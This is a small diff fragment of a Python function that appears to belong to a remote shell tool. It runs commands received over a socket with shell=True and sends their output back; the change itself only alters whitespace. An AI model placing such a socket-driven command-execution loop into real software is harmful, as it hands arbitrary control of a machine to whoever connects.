@@ -52,7 +52,7 @@ def execute_command(s):
 
         proc = subprocess.Popen(data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         stdout_value = proc.stdout.read() + proc.stderr.read()
-
+        
         try:
             s.send(stdout_value)
         except BrokenPipeError:
